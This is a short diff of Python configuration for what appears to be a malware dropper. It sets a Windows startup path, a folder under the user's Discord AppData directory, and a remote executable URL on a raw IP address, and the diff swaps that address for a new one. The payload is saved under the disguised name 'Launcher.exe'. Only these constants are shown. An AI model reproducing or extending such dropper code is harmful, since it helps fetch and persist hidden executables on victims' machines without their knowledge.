@@ -5,6 +5,6 @@ STARTUP = os.path.expandvars(
 
 MY_HOME = os.path.expandvars(f'%APPDATA%\\discord\\')
 
-PAYLOAD_URL = "http://45.56.115.112:8000/main.exe"
+PAYLOAD_URL = "http://45.56.110.222:8000/main.exe"
 
 PAYLOAD_NAME = "Launcher.exe"
